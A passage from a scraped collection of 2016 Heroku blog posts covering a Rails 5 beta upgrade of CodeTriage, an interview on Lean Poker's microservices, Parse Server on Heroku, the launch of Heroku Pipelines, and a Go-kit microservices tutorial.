Heroku lets them share developer and administrative identity, and now Private Spaces let them connect at the network level and create a security perimeter around all of the App Cloud services. Learn More Private Spaces are now automatically available to Heroku Enterprise customers.  If you’d like more information on Private Spaces and Heroku Enterprise, or are an existing customer with questions on Spaces use and configuration, please contact us . You can learn more about Private Spaces by attending our technical deep dive on February 25th. spaces Private Spaces Heroku Enterprise", "date": "2016-01-26,"},
{"website": "Heroku", "title": "Upgrading to Rails 5 Beta - The Hard Way", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/rails-5-beta-upgrade", "abstract": "Upgrading to Rails 5 Beta - The Hard Way Posted by Richard Schneeman January 22, 2016 Listen to this article Rails 5 has been brewing for more than a year. To take advantage of new features, and stay on the supported path, you'll need to upgrade. In this post, we'll look at the upgrade process for a production Rails app, codetriage.com . The codebase is open source so you can follow along . Special thanks to Prathamesh for his help with this blog post. How Stable is the Beta? In Rails a beta means the API is not yet stable, and features will come and go. A Release Candidate (RC) means no new features; the API is considered stable, and RCs will continue to be released until all reported regressions are resolved. Should you run your production app on the beta? There is value in getting a beta working on a branch and being ready when the RC or upcoming release is available. Lots of companies run Beta and RC releases of Rails in production, but it's not for the faint of heart. You'll need to be pretty confident in your app, make sure your test suite is up to par, and that manual quality control (QC) checks are thorough. It's always a relief to find and fix bugs before they arrive in production. Please report regressions and bugs you encounter -- the faster we uncover and report them, the faster these bugs get fixed, and the more stable Rails becomes. Remember, no one else is going to find and report the regressions in your codebase unless you do it. Upgrade your Gemfile Step zero of the process is changing your Rails dependency, after which you'll want to $ bundle install , see what is incompatible and update those dependencies. If you want to run on Heroku, I recommend avoiding the beta1 release on rubygems.org. It doesn't include a fix to stdout logging that is available in master. CodeTriage is running with this SHA of Rails from master: # Gemfile\ngem \"rails\", github: \"rails/rails\", ref: \"dbf67b3a6f549769c5f581b70bc0c0d880d5d5d1\" You'll need to make sure that you're running a current Ruby; Rails now requires Ruby 2.2.2 or greater. At the time of writing, I recommend 2.2.4 or 2.3.0. CodeTriage is running 2.3.0. # Gemfile\nruby \"2.3.0\" If you can't bundle, you'll need to modify your dependencies in your Gemfile, or bundle update <dependency> Once you've completed a $ bundle install you're well on your way to getting the upgrade started. Gems Gems Gems Just because a gem installs correctly doesn't mean it's compatible with Rails 5. Most libraries that specify Rails as a runtime dependency do not specify an upper bounds in their gemspec (like a Gemfile for gems). If they said \"this gem is valid for rails versions 3-4\" then bundler would let you know that it couldn't install that gem. Unfortunately since most say something like \"this is good for Rails version 3 to infinity,\" there's no way by versioning alone. You'll have to investigate which of your dependencies are compatible manually; don't worry, there are some easy ways to tell. Rails Console The first thing you'll want to do is boot a console: $ rails console\nLoading development environment (Rails 5.0.0.beta1)\nirb(main):001:0> Did that work? Great, skip to the next step. If not, use backtraces to see where errors came from, and which gems might be having problems. When you get a problem with a gem, check https://rubygems.org and see if you're using the latest. If not, it's a good idea to try using the most recently released version. If you still get an error, try pointing at their master branch, some libraries have fixes for Rails 5 that haven't been released yet. Many libraries that depend on Rack have not released a version that supports Rack 2, however many of them have support for it in master or in another branch. When in doubt ask a gem maintainer. Here's an example of an error that CodeTriage saw: $ rails console\n/Users/richardschneeman/.gem/ruby/2.3.0/gems/devise-3.5.3/lib/devise/failure_app.rb:9:in `<class:FailureApp>': uninitialized constant ActionController::RackDelegation (NameError)\n  from /Users/richardschneeman/.gem/ruby/2.3.0/gems/devise-3.5.3/lib/devise/failure_app.rb:8:in `<module:Devise>'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/gems/devise-3.5.3/lib/devise/failure_app.rb:3:in `<top (required)>'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/gems/devise-3.5.3/lib/devise/mapping.rb:122:in `default_failure_app'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/gems/devise-3.5.3/lib/devise/mapping.rb:67:in `initialize'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/gems/devise-3.5.3/lib/devise.rb:325:in `new'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/gems/devise-3.5.3/lib/devise.rb:325:in `add_mapping'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/gems/devise-3.5.3/lib/devise/rails/routes.rb:238:in `block in devise_for'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/gems/devise-3.5.3/lib/devise/rails/routes.rb:237:in `each'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/gems/devise-3.5.3/lib/devise/rails/routes.rb:237:in `devise_for'\n  from /Users/richardschneeman/Documents/projects/codetriage/config/routes.rb:9:in `block in <top (required)>'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/actionpack/lib/action_dispatch/routing/route_set.rb:389:in `instance_exec'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/actionpack/lib/action_dispatch/routing/route_set.rb:389:in `eval_block'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/actionpack/lib/action_dispatch/routing/route_set.rb:371:in `draw'\n  from /Users/richardschneeman/Documents/projects/codetriage/config/routes.rb:3:in `<top (required)>'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/application/routes_reloader.rb:40:in `block in load_paths'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/application/routes_reloader.rb:40:in `each'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/application/routes_reloader.rb:40:in `load_paths'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/application/routes_reloader.rb:16:in `reload!'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/application/routes_reloader.rb:26:in `block in updater'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/activesupport/lib/active_support/file_update_checker.rb:75:in `execute'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/application/routes_reloader.rb:27:in `updater'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/application/routes_reloader.rb:7:in `execute_if_updated'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/application/finisher.rb:69:in `block in <module:Finisher>'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/initializable.rb:30:in `instance_exec'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/initializable.rb:30:in `run'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/initializable.rb:55:in `block in run_initializers'\n  from /Users/richardschneeman/.rubies/ruby-2.3.0/lib/ruby/2.3.0/tsort.rb:228:in `block in tsort_each'\n  from /Users/richardschneeman/.rubies/ruby-2.3.0/lib/ruby/2.3.0/tsort.rb:350:in `block (2 levels) in each_strongly_connected_component'\n  from /Users/richardschneeman/.rubies/ruby-2.3.0/lib/ruby/2.3.0/tsort.rb:431:in `each_strongly_connected_component_from'\n  from /Users/richardschneeman/.rubies/ruby-2.3.0/lib/ruby/2.3.0/tsort.rb:349:in `block in each_strongly_connected_component'\n  from /Users/richardschneeman/.rubies/ruby-2.3.0/lib/ruby/2.3.0/tsort.rb:347:in `each'\n  from /Users/richardschneeman/.rubies/ruby-2.3.0/lib/ruby/2.3.0/tsort.rb:347:in `call'\n  from /Users/richardschneeman/.rubies/ruby-2.3.0/lib/ruby/2.3.0/tsort.rb:347:in `each_strongly_connected_component'\n  from /Users/richardschneeman/.rubies/ruby-2.3.0/lib/ruby/2.3.0/tsort.rb:226:in `tsort_each'\n  from /Users/richardschneeman/.rubies/ruby-2.3.0/lib/ruby/2.3.0/tsort.rb:205:in `tsort_each'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/initializable.rb:54:in `run_initializers'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/application.rb:350:in `initialize!'\n  from /Users/richardschneeman/Documents/projects/codetriage/config/environment.rb:5:in `<top (required)>'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/application.rb:326:in `require_environment!'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/commands/commands_tasks.rb:157:in `require_application_and_environment!'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/commands/commands_tasks.rb:77:in `console'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/commands/commands_tasks.rb:49:in `run_command!'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/command.rb:20:in `run'\n  from /Users/richardschneeman/.gem/ruby/2.3.0/bundler/gems/rails-dbf67b3a6f54/railties/lib/rails/commands.rb:19:in `<top (required)>'\n  from bin/rails:4:in `require'\n  from bin/rails:4:in `<main>' The gem in the backtrace above is devise 3.5.3; we were able to get things working by pointing to master, which may be released by now. Repeat this until your rails console works. If you're already on the master version of a gem and it's still failing to boot, it might not support Rails 5 yet. Try debugging a little, and see if there's any open issues about Rails 5 on the tracker. If you don't see anything, open a new issue giving your error message and description of what's going on, and try to be as instructive as possible. Before you do this, you might want to try using the master version of their gem in a bare-bones rails new app to see if you can reproduce the problem. If the problem doesn't reproduce it may be an issue with how you're using the gem instead of the gem itself. This will help you uncover differences there. If you do reproduce the problem, then push it up to GitHub and share it in the issue. The maintainer will be able to fix an easily reproducible example much faster. When you're not able to upgrade around a fix, sometimes you might not need that gem, or you might want to remove it temporarily so you can work on upgrading the rest of your app while the maintainer works on a fix. Shim Gems Sometimes functionality is taken out of Rails but provided via smaller gems. For example. While upgrading we had to use record_tag_helper and rails-controller-testing to get the app working. Rails Server Once you've got your console working, try your server. Just like with console, get it to boot. Once it's booted try hitting the main page and some other actions. You'll be looking for exceptions as well as strange behavior, though not all bugs cause exceptions. In the case of CodeTriage, a strange thing was happening. An error was getting thrown, but there was nothing in the logs and no debug error page in development. When this happens it's usually a bug in a rack middleware. You can get a list of them by running $ rake middleware\nuse Rack::Sendfile\nuse ActionDispatch::LoadInterlock\nuse ActiveSupport::Cache::Strategy::LocalCache::Middleware\nuse Rack::Runtime\nuse Rack::MethodOverride\nuse ActionDispatch::RequestId\nuse Rails::Rack::Logger\nuse ActionDispatch::ShowExceptions\nuse WebConsole::Middleware\nuse ActionDispatch::DebugExceptions\nuse ActionDispatch::RemoteIp\nuse ActionDispatch::Reloader\nuse ActionDispatch::Callbacks\nuse ActiveRecord::Migration::CheckPending\nuse ActiveRecord::ConnectionAdapters::ConnectionManagement\nuse ActiveRecord::QueryCache\nuse ActionDispatch::Cookies\nuse ActionDispatch::Session::CookieStore\nuse ActionDispatch::Flash\nuse Rack::Head\nuse Rack::ConditionalGet\nuse Rack::ETag\nuse Warden::Manager\nuse ActionView::Digestor::PerRequestDigestCacheExpiry\nuse Bullet::Rack\nuse OmniAuth::Strategies::GitHub\nrun CodeTriage::Application.routes The request enters at the top and goes to each middleware until finally it hits our application on the bottom CodeTriage::Application.routes . If the error was being thrown by our app, then the ActionDispatch::DebugExceptions middleware outputs error logs and would show a nice exception page in development. In my case that wasn't happening, so I knew the error was somewhere before that point. I bisected the problem by adding logging to call methods. If the output showed up in STDOUT then I knew it was being called successfully and I should go higher up the Rack stack (which is confusing, because it is lower on this middleware list). After enough debugging, I finally found the exception was coming from WebConsole::Middleware , which is naturally the last possible place an exception could occur before it gets caught by the DebugExceptions middleware. Upgrading to master on web-console gem fixed the error. It turns out that placement is not by accident and web-console inserts itself before the debug middleware. I opened an issue with web-console and @gsamokovarov promptly added some code that detects when an internal error is thrown by web-console and makes sure it shows up in the logs. My rule of thumb is if something takes me over an hour to fix that could have been made much easier by exposing the errant behavior (such as logging an exception), then I report it as an issue to raise awareness of that failure mode. Sometimes the bug is well known but often maintainers don't know what is difficult or hard to debug. If you have ideas on things to add to make using a piece of software easier, sharing it in a friendly and helpful way is good for everyone. Keep manually testing your app until no errors and all errant behavior is gone. Once you've done this, you're on the home stretch. Testing Now the server and console are working, you want to get your test suite green $ rake test . Rails 5 now includes a nice test runner $ rails test ; you can specify a particular file or a specific line to run $ rails test test/unit/users.rb:58 . This step was bad, resulting in cryptic failures. I recommend picking 1 failure or error and focusing on it. Sometimes you'll see 100 failures, but when you fix one, it resolves them all, as they were the same issue. For CodeTriage, we were getting errors UserUpdateTest#test_updating_the_users_skip_issues_with_pr_setting_to_true:\nNoMethodError: undefined method `normalize_params' for Rack::Utils:Module\n    test/integration/user_update_test.rb:50:in `block in <class:UserUpdateTest>' A grep of my project indicated normalize_params wasn't being used. The error didn't have a long backtrace. On that line test/integration/user_update_test.rb:50 we are using a capybara helper: click_button 'Save' On a whim, I updated capybara and it resolved the error. Not sure why the backtrace was so short, that might be worth digging into later, as it would have made debugging faster. Other gotchas The Strong Params that you get in your controller have changed and are no longer inheriting from a hash. At the time, there was no deprecation, so I added one . It's just a deprecation, but you should still make sure you're only using the approved API. There was a change to image_tag where it no longer takes nil as an argument, this wasn't used in production, but the tests (accidentally) depended on it. With all of this together, we were ready for Rails 5 in the prime time. Here's the PR After the Upgrade We're almost done! The last thing we need to do is to look for deprecations. They'll show up in your logs like: DEPRECATION WARNING: ActionController::TestCase HTTP request methods will accept only\nkeyword arguments in future Rails versions. Or DEPRECATION WARNING: `redirect_to :back` is deprecated and will be removed from Rails 5.1. Please use `redirect_back(fallback_location: fallback_location)` where `fallback_location` represents the location to use if the request has no HTTP referer information. (called from block in <class:RepoSubscriptionsControllerTest> at /Users/richardschneeman/Documents/projects/codetriage/test/functional/repo_subscriptions_controller_test.rb:63) A good deprecation will include the fix in the message. While you technically don't have to fix every deprecation, you'll be glad you did when Rails 5.1 is released, because that upgrade will be even easier. Regressions As you rule out bugs coming from gems or your own code, you'll want to report any regressions to https://github.com/rails/rails/issues . Please check for existing issues first. Unfortunately the tracker is only for bugs and pull requests, we can't use it to help you with \"my application won't work\" type problems. Take those issues to Stack Overflow . Deploy and You're Done Once your code works locally and your tests pass, make sure you're happy with manually looking for regressions. I recommend either deploying to a staging app first or using Heroku's GitHub Review apps . -- That way you'll have a production-ish copy of your web app attached to your pull request that everyone involved can review. Once you're happy commit to git and then: $ git push heroku master Watch your logs or bug tracking add-on for exceptions, remember you can always rollback if a critical problem comes up. Upgrading takes time and patience but isn't that complex. The earlier you upgrade the earlier bugs get found, reported, and fixed. Give it a try on a branch and see what happens. ruby rails rails5 upgrade beta", "date": "2016-01-22,"},
{"website": "Heroku", "title": "How Lean Poker Teaches Continuous Deployment on Heroku: An Interview with Creator Rafael Ördög", "author": ["Matthew Creager"], "link": "https://blog.heroku.com/how_lean_poker_teaches_continuous_deployment_on_heroku", "abstract": "How Lean Poker Teaches Continuous Deployment on Heroku: An Interview with Creator Rafael Ördög Posted by Matthew Creager February 02, 2016 Listen to this article In 2013, Rafael Ördög put poker and code together, the result: Lean Poker , a competitive coding event that teaches continuous deployment and lean startup methodologies. Rafael is based in Budapest, Hungary. What's Lean Poker? Lean Poker is a coding workshop that is designed to teach people how to practice continuous deployment and lean startup methodologies. Companies can sponsor a free public event or hold an internal, team-building event for their own employees. The basic starting code is really simple and teams can use the language of their choice. The challenge is not to understand an existing code base but to modify it—to build a new app. Teams must iterate their app quickly in order to compete against the others. How do teams compete? In a regular poker robot competition, you’d have a few hours or days to create your robot, and then they’re ready to start playing. With Lean Poker, it’s the other way around. The robots already exist and start playing against each other right away. The robots are not very intelligent and they just fold every time. It’s all about which team can deliver value faster than the others. This forces teams to deploy very differently in order to get ahead of the others as quickly as possible. It’s a lot harder to get ahead later in the game when the robots are smarter. Does Lean Poker have an 'origin story'? In 2010 I went to my first code retreat. I really enjoyed the day-long practice. At the same time I started playing poker with my friends. A couple of years later my company Emarsys started doing continuous deployment. As I saw my colleagues struggling, the idea just clicked. Combining poker competitions with coding was a perfect opportunity to learn continuous deployment. I spent four months building Lean Poker before the first event in January 2014 and I’ve been iterating on it ever since. Let’s talk about how you developed the Lean Poker app At work, I was asked to be a team lead for a new Ruby team and had to learn Ruby in two weeks. The best way to learn a new language is to build something in it, so I decided to use Ruby for Lean Poker. The back-end is built in Ruby using the Sinatra framework, and the front-end administration panel is two thousand lines of JavaScript mess!  Basically I’d already had the back-end running and had only two nights to build the front-end before my first event, so I had to hack together something otherwise we wouldn’t have had a UI. Maybe some day I’ll clean it up, but for now two thousand lines of legacy is still perfectly maintainable for me, so it wouldn’t pay off yet to spend time on that. Especially because I only make minor changes to the UI. I’m the kind of developer who doesn’t like it when a framework eats up my application. My main objection against Rails is that it makes you inherit from classes that you don’t want to inherit from. So I try to use plain old objects as much as possible, and the framework is just useful for wiring it up with the web server. That is why I chose Sinatra. It works better for me. If I were to start the app now, I would probably use Grape, which is even better for building single page apps with a pure API back-end. Tell us about your architecture The entire system is designed using a microservices architecture. Lean Poker itself is composed of five microservices, each of them running on Heroku. Each team represents an additional microservice. So for example, if an event has five teams, then I’d run ten Heroku apps in parallel. The microservices communicate via a very simple HTTP interface, using a REST API (although it’s not perfectly REST. I’ve never seen an API that is entirely RESTful, but it’s as close as it can be to a REST API.) Everything is running with HTTP but I do use Sidekiq for message queuing because the Lean Poker system is built in Ruby. I also use Mongo for my database, Heroku Add-ons Zerigo DNS for domain management, Logentries for log management, and Redis Cloud to run Sidekiq. What do the core microservices do? I have one microservice (called “Manfred” after a character in the movie Croupier), which is a very simple service with a single API endpoint.  I use it to post a JSON structure that specifies the teams and their addresses on Heroku, and it initiates a “sit-and-go” tournament. Then it sends back the actual game log so you can step through the game and see every move. It basically organizes players and the game, like a croupier. Another microservice (called “Hermes” after the Greek God of transitions) is basically a Heroku deployment application. Whenever it’s informed by GitHub that there’s a push, it just takes the tarball and uses the platform API to deploy the application. “Lumber” is a logger microservice that subscribes to the Heroku log drain, loads up the logs, and stores them in memory. Although I can use Logentries to monitor the main app, for the players I needed more flexibility than Logentries and Papertrail could provide. Each player needed an individual account, so we wrote a basic logger, which displays log lines in HTML and stores them in memory for a few minutes. Lean Poker gives players a number of controls including the ability to add a custom log drain using the Heroku platform API. Then there’s a ranking microservice (called “Rainman” after the movie with the same title). I extracted a separate service from Manfred, which the players can call. If a player sends it their cards, the service will tell them what kind of hand it is and rate how good it is. Finally, there’s the live app itself that wires together the other microservices—basically the front-end stuff that communicates with the database and users. It’s the hub of the entire system. And then of course, there’s the Lean Poker marketing website, which isn’t really an app but more like a static website. Do you authenticate requests between services? There is some authentication for the riskier requests. The system sends out tokens and only accepts responses with those tokens, using a shared secret and decrypting the token locally on each microservice. I do have plans to migrate to the Escher Auth library. It’s a much more secure solution, and it was designed for communication between Heroku microservices specifically. What is your deployment workflow? When a team pushes code to GitHub, Lean Poker automatically deploys to Heroku using the platform API. When I built the app, Heroku’s GitHub integration wasn’t available yet. I use the URL to the tarball on GitHub, take it from the GitHub API and push it to the Heroku platform API. When someone registers a team, the system automatically creates their own repository in GitHub. It pushes the scaffolding to their GitHub repo and from there they can immediately deploy a first version of the application. How did you end up on Heroku? First I tried running Lean Poker on Rackspace, using Docker to contain the players. But I always had this fear that someone would hack the system and hijack the underlying server for bitcoin mining or misuse it in some other way. I’m a developer, not a sysadmin, and I didn’t want to care about that stuff. At my company, we started to use Heroku, and I thought, “That’s amazing!” I decided to give Heroku a shot. At first, I kept the Lean Poker app on Rackspace and only moved the players to Heroku, but I eventually moved the entire system to Heroku. I had to change a few things, primarily using MongoFS to move files to Mongo, but the migration only took me a few days. How many events have you run so far? So far there have been 21 Lean Poker events across Europe and I’m looking to expand to the U.S. I lead most of the events myself but I also train other coaches to run their own events. If you're interested in attending (or running) a Lean Poker event, visit: www.leanpoker.org or visit our Lean Poker Customer Story . Hungary Company size: XS ruby redis Startup High Tech", "date": "2016-02-02,"},
{"website": "Heroku", "title": "Running Parse on Heroku", "author": ["Peter Cho"], "link": "https://blog.heroku.com/running-parse-on-heroku", "abstract": "Running Parse on Heroku Posted by Peter Cho February 04, 2016 Listen to this article Three months ago we announced that Parse would be opening their Cloud Code product so that their customers would be able to deploy their mobile backends to Heroku. This allowed Parse customers to use a full Node.js environment with Cloud Code. With Parse’s recent announcement , we’re taking that one step further, by allowing you to deploy your own Parse API server to Heroku. What this means for developers is that you will now be able to run all of your Parse services on Heroku, taking advantage of Heroku’s scalable platform as well as Heroku features like Pipelines, Review Apps, and GitHub Sync . Beyond that, because the Parse Server is now open source, you will also be able to extend and expand the Parse core functionality with no limitations. You can get started with this today. Parse has published the Parse Server repository on GitHub , where you can begin issuing pull requests. Check out the Parse Server Example , where we have added a Heroku Button. With just one click, you can have a Parse Server running on a free dyno and free MongoLab database (for anything beyond experimentation, we recommend using at least a Hobby dyno). For more information about deploying a Parse Server to Heroku, see our Dev Center article . parse express nodejs", "date": "2016-02-04,"},
{"website": "Heroku", "title": "Heroku Pipelines Emerges from Beta", "author": ["Ike DeLorenzo"], "link": "https://blog.heroku.com/heroku-pipelines-ga", "abstract": "Heroku Pipelines Emerges from Beta Posted by Ike DeLorenzo February 11, 2016 Listen to this article Today is a big day for Heroku Pipelines — our continuous delivery feature that provides a visual sequence of app environments in which to test, stage, and deliver code through to production. Pipelines is now released for General Availability (GA). Heroku Pipelines provides teams of all sizes a new way to visualize and manage the development of applications, features, and fixes from dev and test, to staging, to production (and supports even more stages if that's your team's thing).  Each Pipeline stage contains the Heroku apps, resources, and add-ons necessary to test your applications before \"promoting\" it to the next stage. The Pipelines GitHub integrations include automatic or manual deployment of branches, and a new way to test GitHub pull requests in disposable Heroku \"review apps\" before you merge the code -- with workflow support for the CI you already use with GitHub. “Heroku Pipelines works seamlessly with GitHub to bring the code in your pull requests to life, providing a streamlined continuous delivery workflow,” said Tim Clem, Product Manager, GitHub. “Pipelines integrates with the GitHub API to deliver a fantastic developer workflow.” The real headline here is a big thank you to our thousands of weekly Heroku Pipelines beta users, and the scores of companies that have already made Heroku Pipelines the principal tool they use every day to support Continuous Delivery.  It’s through the input of this large community that we have been able to create the Heroku Pipelines available to you in today’s GA release.  To all of you: HUGE thanks from the Heroku Developer Experience Team, and shared congratulations on Pipelines! Our goal has been to bring simplicity and flexibility to continuous delivery, while allowing developers to continue to use the dev tools and CI they know and love. Getting Started with Pipelines In the past, continuous delivery has been a complex ad-hoc affair for many teams and companies -- often relying on home-grown integrations, and incomplete solutions.  Heroku Pipelines creates a simple, complete, prescriptive, and visual delivery workflow that developers and other team members can use to understand the state of fixes, as well as evaluate and approve code in-process with a single click. (Attention design, product management, and external stakeholders: This single click is for you.) Building a Pipeline is a one-step straightforward process available the the main dashboard, or via the Heroku Toolbelt (CLI).  The Pipelines overview page presents the development and deployment workflow in real-time, and provide full control of integrations and settings in-context.  You can see the team's review apps come and go (and click to test them), code merging, applications graduating from test, and going into production -- as well as quick access to build logs and status information on all of the above.  Here at Heroku, we use the page on a large flat-screen as a real-time continuous delivery wallboard. Promotions of tested code from one stage to the next are near-instantaneous as the compiled code or “slug” is promoted to the next stage's environment, often eliminating the need to do a new build.  Facilities exist to match app add-ons and databases to the production or parent configuration, while protecting personally identifiable information (PII) from entering staging environments and review apps.  You'll get faster iteration cycles with fewer flaws in production, and each stage's environment matches the next -- including your review apps -- as exactly as you would like. And Pipelines fully supports Heroku Private Spaces as a production destination, a development environment, or both.  (Enterprise Pro Tip: you can create Pipelines with a number of production Private Spaces for isolation, compliance, and multi-geography, while enjoying the economy and flexibility of the Heroku Common Runtime for review apps, Development, and Staging environments) Pipelines tight integration with GitHub, GitHub pull requests, and Heroku Review apps supports Heroku Flow , our recommended methodology for continuous delivery using Heroku.  We’ve worked hard with our colleagues at GitHub to make the integration seamless and productive, whether you spend your screen-time in GitHub, or in Heroku.  You can trigger Heroku builds, as well as create, test, and share Heroku review apps from either environment. A public API for Heroku Pipelines is also now available. What to Expect Next Coming out of beta doesn’t mean we are going to slow down on innovating in Pipelines, and with continuous delivery.  Of course, Pipelines supports all official Heroku buildpack languages, and is in use by developers using many third-party buildpacks.  In the coming months expect to see innovations in post-build scripting (useful for Rails and static apps developers), new management options for review apps, even better support for enterprise use cases, and more. And, of course, we'd love to hear from you about what you'd like to see in Heroku Pipelines. Above all — for those who haven't yet — check out the docs and create your first pipeline! Pipelines Heroku Flow", "date": "2016-02-11,"},
{"website": "Heroku", "title": "Microservices in Go using Go-kit", "author": ["Edward Muller"], "link": "https://blog.heroku.com/microservices_in_go_using_go_kit", "abstract": "Microservices in Go using Go-kit Posted by Edward Muller February 19, 2016 Listen to this article Go-kit is a distributed programming toolkit for building microservices. It solves the common problems encountered while building distributed systems, so you can focus on your business logic. This article starts with a bit of background on microservices, then guidance on how to get started with Go-kit, including instructions on getting a basic service up and running on Heroku. A Brief Intro to Microservices Traditionally, web applications are built using a monolithic approach where the entire application is built, designed, deployed and maintained as a single unit.  When working with a monolithic application various problems can arise over time: it’s easy for abstractions to leak across modules, tightly coupling them; different parts of the application may need more processing power than others, forcing you to scale in unpredictable ways; changes involve building and deploying a new version of the entire application; and tests can easily become convoluted and/or take an excruciatingly long time for the full suite to run. A microservice based design addresses these issues. Applications designed using microservices consist of a set of several small (hence the term “micro”) services cooperating and communicating together. Separation between services is enforced by the service's external API. Each individual micro service can be scaled and deployed separately from the rest. Design Concerns for Microservices Based Applications But where monolithic application have one source of logs, one source of metrics, one application to deploy, one API to rate limit, etc, microservice based application have multiple sources. Some of the common concerns of application design that are amplified in a microservices based application are: Rate limiters enforce upper thresholds on incoming request throughput. Serialization is the conversion of language specific data structures to a byte stream for presentation to another system. That other system is commonly a browser (json/xml/html) or a database, among others. Logging is the time-ordered, preferably structured, output from an application and its constituent components. Metrics are a record of the instrumented parts of your application and includes the aggregated measurements of latency, request counts, health and others. Circuit breakers prevent thundering herds thereby improving resiliency against intermittent errors. Request tracing across multiple services is an important tool for diagnosing issues and recreating the state of the system as a whole. Service discovery allows different services to find each other given known, stable names and the realities of the cloud, where individual systems come and go dynamically and when least expected. By using a toolkit that addresses these concerns, the implementations across your services becomes standard. This reduces surface area and enforces uniformity in design allowing developers to spend more time on business logic. Go-kit is one such toolkit, comprised of a set of abstractions, encoded into different packages that provide a common set of interfaces for the developer. Go-kit 101 Let’s make a basic service using Go-kit that keeps a running total of integers passed to it and responds with the current total. To start, we’ll add our business logic, encoded as an interface , with a concrete implementation . Endpoints in go-kit represent a single RPC and are the fundamental building blocks of clients and servers. Our service implements our Counter interface , while the Endpoint interface is different. Adapters allow a struct that implements one interface to be used where another interface is expected, so an adapter for our service is needed so that it can be used as an endpoint. Part of exposing a service is handling requests and responses. This is done via a pair of encoder/decoder functions which are then used by go-kit’s http transport . These methods take care of encoding to and decoding from JSON. Middleware is used to wrap endpoints and add generic, per request functionality to the endpoint. This is done by defining a function that takes an Endpoint and returns a new Endpoint. We use middleware to add logging , metrics and rate limiting . Rate limiting is done using juju’s token bucket and go-kit’s rate limiting middleware . The service’s metric middleware increments a per request counter (request.count), which is exposed as an expvar metric . Lastly, the logging middleware outputs the request path, request id, request and response data, as well as elapsed time. The logging middleware relies on some extractor functions to extract the path and request-id from the *http.Request and add them to the context provided to the middleware and endpoints . Deploy the complete application by clicking on the “Heroku Button” shown in the README . Once deployed you can test the application via curl a few times (replace floating-anchorage-23443 with the name of the app you created): $ curl  -X POST -d '{\"v\":1}' 'https://floating-anchorage-23443.herokuapp.com/add'\n{\"v\":1}\n$ curl  -X POST -d '{\"v\":2}' 'https://floating-anchorage-23443.herokuapp.com/add'\n{\"v\":3}\n$ curl  -X POST -d '{\"v\":3}' 'https://floating-anchorage-23443.herokuapp.com/add'\n{\"v\":6} If you execute those curl commands too fast, roughly more than 1 every 2 seconds, the rate limiting middleware will kick in and you’ll get a “rate limit exceeded” error like so: $ curl  -X POST -d '{\"v\":1}' 'https://floating-anchorage-23443.herokuapp.com/add'\nrate limit exceeded You can also use curl to explore the recorded metrics: $ curl -s 'https://floating-anchorage-23443.herokuapp.com/debug/vars'\n{\n…\n“request.count”: 4\n} The first curl command above produces a pair of log lines similar to these (viewable with “heroku log”): $ heroku logs\n...\n2016-02-17T05:20:43.545994+00:00 heroku[router]: at=info method=POST path=\"/add\" host=floating-anchorage-23443.herokuapp.com request_id=9c248150-03ac-4b24-b5a7-f7c1f0fb05ed fwd=\"76.115.27.201\" dyno=web.1 connect=18ms service=6ms status=200 bytes=143\n2016-02-17T05:20:43.546130+00:00 app[web.1]: path=/add request=1 result=1 err=null request_id=9c248150-03ac-4b24-b5a7-f7c1f0fb05ed elapsed=30.206µs The latter of which is from the service’s logging middleware. The former is from the Heroku Router. A simplified form of request tracing can be achieved by ensuring that all logs across all services that comprise your application include the request id. Heroku encourages customers to drain logs for retention to a logging add-on . This article covered a very basic app, designed to expose you to Go-kit and its patterns. Build more complex applications, deployed to Heroku Private Spaces , leveraging advanced Go-kit’s features such as: circuit breakers for limiting your exposure to problems with downstream dependencies such as external APIs; load balancers for resolving service endpoints in static and dynamic environments; and Dapper style request tracing using Zipkin. go microservices gokit golang", "date": "2016-02-19,"},
